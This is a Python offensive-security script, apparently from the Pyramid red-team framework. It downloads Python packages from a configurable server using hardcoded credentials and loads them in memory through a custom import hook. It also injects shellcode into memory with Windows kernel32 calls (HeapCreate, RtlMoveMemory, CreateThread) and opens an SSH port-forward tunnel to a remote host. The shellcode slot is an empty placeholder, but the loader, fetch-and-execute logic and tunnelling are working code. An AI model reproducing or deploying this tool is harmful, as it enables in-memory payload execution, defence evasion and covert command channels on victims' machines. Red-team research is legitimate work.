'''
Author: @naksyn (c) 2022
-
Copyright 2022 naksyn
Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"),
to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense,
and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, 
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, 
DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE 
OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

This script also contains an adaptation of https://raw.githubusercontent.com/paramiko/paramiko/main/demos/forward.py

'''

import os
import base64
import ssl
import importlib
import urllib.request
import sys
import zipfile
import io
import time
import logging
import ctypes
import ctypes.wintypes as wt
import inspect
import distutils
import getpass
import socket
import select

try:
    import SocketServer
except ImportError:
    import socketserver as SocketServer

from optparse import OptionParser

#### CHANGE THIS ###
pyramid_server='192.168.1.1'
pyramid_port='8000'
pyramid_user='testuser'
pyramid_pass='Sup3rP4ss!'
SSH_server =("192.168.1.2", int("22")) # REMOTE SSH SERVER
SSH_remotefw =("127.0.0.1",int("443")) # REMOTE ADDRESS AND PORT TO FORWARD
DEFAULT_LISTENING_PORT = int(443) # LOCAL LISTENING PORT
SSH_password = "changeme"
SSH_username = "changeme"
SSH_PORT=22
####################

cwd = os.getcwd()

fileName='paramiko_pyds_dependencies.zip'
print("[*] Downloading and unpacking on disk pyds dependencies : " + fileName)
gcontext = ssl.SSLContext()
request = urllib.request.Request('https://'+ pyramid_server + ':' + pyramid_port + '/' + fileName)
base64string = base64.b64encode(bytes('%s:%s' % (pyramid_user, pyramid_pass),'ascii'))
request.add_header("Authorization", "Basic %s" % base64string.decode('utf-8'))
with urllib.request.urlopen(request, context=gcontext) as response:
   zip_web = response.read()
   
with zipfile.ZipFile(io.BytesIO(zip_web), 'r') as zip_ref:
    zip_ref.extractall(cwd)




#### MODULE IMPORTER ####

moduleRepo = {}
_meta_cache = {}

# [0] = .py ext, is_package = False
# [1] = /__init__.py ext, is_package = True
_search_order = [('.py', False), ('/__init__.py', True)]

class ZipImportError(ImportError):
	"""Exception raised by zipimporter objects."""

# _get_info() = takes the fullname, then subpackage name (if applicable),
# and searches for the respective module or package

class CFinder(object):
	"""Import Hook"""
	def __init__(self, repoName):
		self.repoName = repoName
		self._source_cache = {}

	def _get_info(self, repoName, fullname):
		"""Search for the respective package or module in the zipfile object"""
		parts = fullname.split('.')
		submodule = parts[-1]
		modulepath = '/'.join(parts)

		#check to see if that specific module exists

		for suffix, is_package in _search_order:
			relpath = modulepath + suffix
			try:
				moduleRepo[repoName].getinfo(relpath)
			except KeyError:
				pass
			else:
				return submodule, is_package, relpath

		#Error out if we can find the module/package
		msg = ('Unable to locate module %s in the %s repo' % (submodule, repoName))
		raise ZipImportError(msg)

	def _get_source(self, repoName, fullname):
		"""Get the source code for the requested module"""
		submodule, is_package, relpath = self._get_info(repoName, fullname)
		fullpath = '%s/%s' % (repoName, relpath)
		if relpath in self._source_cache:
			source = self._source_cache[relpath]
			return submodule, is_package, fullpath, source
		try:
			### added .decode
			source =  moduleRepo[repoName].read(relpath).decode()
			#print(source)
			source = source.replace('\r\n', '\n')
			source = source.replace('\r', '\n')
			self._source_cache[relpath] = source
			return submodule, is_package, fullpath, source
		except:
			raise ZipImportError("Unable to obtain source for module %s" % (fullpath))

	def find_module(self, fullname, path=None):

		try:
			submodule, is_package, relpath = self._get_info(self.repoName, fullname)
		except ImportError:
			return None
		else:
			return self

	def load_module(self, fullname):
		submodule, is_package, fullpath, source = self._get_source(self.repoName, fullname)
		code = compile(source, fullpath, 'exec')
		spec = importlib.util.spec_from_loader(fullname, loader=None)
		mod = sys.modules.setdefault(fullname, importlib.util.module_from_spec(spec))
		mod.__loader__ = self
		mod.__file__ = fullpath
		mod.__name__ = fullname
		if is_package:
			mod.__path__ = [os.path.dirname(mod.__file__)]
		exec(code,mod.__dict__)
		return mod

	def get_data(self, fullpath):

		prefix = os.path.join(self.repoName, '')
		if not fullpath.startswith(prefix):
			raise IOError('Path %r does not start with module name %r', (fullpath, prefix))
		relpath = fullpath[len(prefix):]
		try:
			return moduleRepo[self.repoName].read(relpath)
		except KeyError:
			raise IOError('Path %r not found in repo %r' % (relpath, self.repoName))

	def is_package(self, fullname):
		"""Return if the module is a package"""
		submodule, is_package, relpath = self._get_info(self.repoName, fullname)
		return is_package

	def get_code(self, fullname):
		submodule, is_package, fullpath, source = self._get_source(self.repoName, fullname)
		return compile(source, fullpath, 'exec')

def install_hook(repoName):
	if repoName not in _meta_cache:
		finder = CFinder(repoName)
		_meta_cache[repoName] = finder
		sys.meta_path.append(finder)

def remove_hook(repoName):
	if repoName in _meta_cache:
		finder = _meta_cache.pop(repoName)
		sys.meta_path.remove(finder)

def hook_routine(fileName,zip_web):
	zf=zipfile.ZipFile(io.BytesIO(zip_web), 'r')
	moduleRepo[fileName]=zf
	install_hook(fileName)


zip_list=['six', 'cffi', 'paramiko' ]
	
for zip_name in zip_list:
    try:
        print("[*] Loading in memory module package: " + zip_name)
        gcontext = ssl.SSLContext()
        request = urllib.request.Request('https://'+ pyramid_server + ':' + pyramid_port + '/' + zip_name + '.zip')
        base64string = base64.b64encode(bytes('%s:%s' % (pyramid_user, pyramid_pass),'ascii'))
        request.add_header("Authorization", "Basic %s" % base64string.decode('utf-8'))
        with urllib.request.urlopen(request, context=gcontext) as response:
            zip_web = response.read()
            hook_routine(zip_name, zip_web)
        
    except Exception as e:
        print(e)


kernel32 = ctypes.windll.kernel32

#### PUT YOUR SHELLCODE HERE ####

sc =  b""


def kernel32_function_definitions(sc):



    # HeapAlloc()

    HeapAlloc = ctypes.windll.kernel32.HeapAlloc

    HeapAlloc.argtypes = [wt.HANDLE, wt.DWORD, ctypes.c_size_t]

    HeapAlloc.restype = wt.LPVOID



    # HeapCreate()

    HeapCreate = ctypes.windll.kernel32.HeapCreate

    HeapCreate.argtypes = [wt.DWORD, ctypes.c_size_t, ctypes.c_size_t]

    HeapCreate.restype = wt.HANDLE



    # RtlMoveMemory()

    RtlMoveMemory = ctypes.windll.kernel32.RtlMoveMemory

    RtlMoveMemory.argtypes = [wt.LPVOID, wt.LPVOID, ctypes.c_size_t]

    RtlMoveMemory.restype = wt.LPVOID

    # CreateThread()

    CreateThread = ctypes.windll.kernel32.CreateThread

    CreateThread.argtypes = [

        wt.LPVOID, ctypes.c_size_t, wt.LPVOID,

        wt.LPVOID, wt.DWORD, wt.LPVOID

    ]

    CreateThread.restype = wt.HANDLE

    # WaitForSingleObject

    WaitForSingleObject = kernel32.WaitForSingleObject

    WaitForSingleObject.argtypes = [wt.HANDLE, wt.DWORD]

    WaitForSingleObject.restype = wt.DWORD



    try:

        heap = HeapCreate(0x00040000, len(sc), 0)

        HeapAlloc(heap, 0x00000008, len(sc))

        print('[*] HeapAlloc() Memory at: {:08X}'.format(heap))

        RtlMoveMemory(heap, sc, len(sc))

        print('[*] Shellcode copied into memory.')

        thread = CreateThread(0, 0, heap, 0, 0, 0)

        print('[*] CreateThread() in same process.')

        WaitForSingleObject(thread, 0xFFFFFFFF)
        
    except KeyboardInterrupt:
        print('Got Interrupt')
        sys.exit(1)


# Copyright (C) 2003-2007  Robey Pointer <robeypointer@gmail.com>
#
# This file is part of paramiko.
#
# Paramiko is free software; you can redistribute it and/or modify it under the
# terms of the GNU Lesser General Public License as published by the Free
# Software Foundation; either version 2.1 of the License, or (at your option)
# any later version.
#
# Paramiko is distributed in the hope that it will be useful, but WITHOUT ANY
# WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR
# A PARTICULAR PURPOSE.  See the GNU Lesser General Public License for more
# details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with Paramiko; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301 USA.

"""
Sample script showing how to do local port forwarding over paramiko.

This script connects to the requested SSH server and sets up local port
forwarding (the openssh -L option) from a local port through a tunneled
connection to a destination reachable from the SSH server machine.
"""



import paramiko
import _thread


g_verbose = True


class ForwardServer(SocketServer.ThreadingTCPServer):
    daemon_threads = True
    allow_reuse_address = True


class Handler(SocketServer.BaseRequestHandler):
    def handle(self):
        try:
            chan = self.ssh_transport.open_channel(
                "direct-tcpip",
                (self.chain_host, self.chain_port),
                self.request.getpeername(),
            )
        except Exception as e:
            verbose(
                "Incoming request to %s:%d failed: %s"
                % (self.chain_host, self.chain_port, repr(e))
            )
            return
        if chan is None:
            verbose(
                "Incoming request to %s:%d was rejected by the SSH server."
                % (self.chain_host, self.chain_port)
            )
            return

        verbose(
            "Connected!  Tunnel open %r -> %r -> %r"
            % (
                self.request.getpeername(),
                chan.getpeername(),
                (self.chain_host, self.chain_port),
            )
        )
        while True:
            r, w, x = select.select([self.request, chan], [], [])
            if self.request in r:
                data = self.request.recv(1024)
                if len(data) == 0:
                    break
                chan.send(data)
            if chan in r:
                data = chan.recv(1024)
                if len(data) == 0:
                    break
                self.request.send(data)

        peername = self.request.getpeername()
        chan.close()
        self.request.close()
        verbose("Tunnel closed from %r" % (peername,))


def forward_tunnel(local_port, remote_host, remote_port, transport):
    # this is a little convoluted, but lets me configure things for the Handler
    # object.  (SocketServer doesn't give Handlers any way to access the outer
    # server normally.)
    class SubHander(Handler):
        chain_host = remote_host
        chain_port = remote_port
        ssh_transport = transport

    ForwardServer(("127.0.0.1", local_port), SubHander).serve_forever()


def verbose(s):
    if g_verbose:
        print(s)


HELP = """\
Set up a forward tunnel across an SSH server, using paramiko. A local port
(given with -p) is forwarded across an SSH session to an address:port from
the SSH server. This is similar to the openssh -L option.
"""


def get_host_port(spec, default_port):
    "parse 'hostname:22' into a host and port, with the port optional"
    args = (spec.split(":", 1) + [default_port])[:2]
    args[1] = int(args[1])
    return args[0], args[1]


def parse_options():
    global g_verbose

    parser = OptionParser(
        usage="usage: %prog [options] <ssh-server>[:<server-port>]",
        version="%prog 1.0",
        description=HELP,
    )
    parser.add_option(
        "-q",
        "--quiet",
        action="store_false",
        dest="verbose",
        default=True,
        help="squelch all informational output",
    )
    parser.add_option(
        "-p",
        "--local-port",
        action="store",
        type="int",
        dest="port",
        default=DEFAULT_LISTENING_PORT,
        help="local port to forward (default: %d)" % DEFAULT_LISTENING_PORT,
    )
    parser.add_option(
        "-u",
        "--user",
        action="store",
        type="string",
        dest="user",
        default="nak",
        help="username for SSH authentication (default: %s)"
        % getpass.getuser(),
    )
    parser.add_option(
        "-K",
        "--key",
        action="store",
        type="string",
        dest="keyfile",
        default=None,
        help="private key file to use for SSH authentication",
    )
    parser.add_option(
        "",
        "--no-key",
        action="store_false",
        dest="look_for_keys",
        default=True,
        help="don't look for or use a private key file",
    )
    parser.add_option(
        "-P",
        "--password",
        action="store_true",
        dest="readpass",
        default=SSH_password,
        help="read password (for key or password auth) from stdin",
    )
    parser.add_option(
        "-r",
        "--remote",
        action="store",
        type="string",
        dest="remote",
        default="placeholder_null",
        metavar="host:port",
        help="remote host and port to forward to",
    )
    options, args = parser.parse_args()

    #if len(args) != 1:
    #    parser.error("Incorrect number of arguments.")
    #if options.remote is None:
    #    parser.error("Remote address required (-r).")

    g_verbose = options.verbose
    server_host, server_port = get_host_port("", SSH_PORT)
    remote_host, remote_port = get_host_port("", SSH_PORT)
    return options, (server_host, server_port), (remote_host, remote_port)


def main():
	
	
	
    options, server, remote = parse_options()
    
    server =SSH_server # REMOTE SSH SERVER
    remote =SSH_remotefw # REMOTE ADDRESS AND PORT TO FORWARD
    
    password = SSH_password
    username = SSH_username

    
    
    #if options.readpass:
    #    password = getpass.getpass("Enter SSH password: ")

    client = paramiko.SSHClient()
    client.load_system_host_keys()
    client.set_missing_host_key_policy(paramiko.WarningPolicy())

    verbose("[*] Connecting to remote ssh host %s:%d ..." % (server[0], server[1]))
    try:
        client.connect(
            server[0],
            server[1],
            username=username,
            key_filename=options.keyfile,
            look_for_keys=options.look_for_keys,
            password=password,
        )
    except Exception as e:
        print("*** Failed to connect to %s:%d: %r" % (server[0], server[1], e))
        sys.exit(1)

    verbose(
        "[*] Forwarding local port %s to post-SSH-tunnel host %s:%s ..."
        % (options.port, remote[0], remote[1])
    )

    try:
        print("[*] Starting new thread for shellcode injection")
        _thread.start_new_thread(forward_tunnel,(options.port, remote[0], remote[1], client.get_transport(),))
        kernel32_function_definitions(sc)
        
    except KeyboardInterrupt:
	    print("C-c: Exiting.")
	    sys.exit(1)
	    
	    
        
        
    
    

if __name__ == "__main__":
    main()
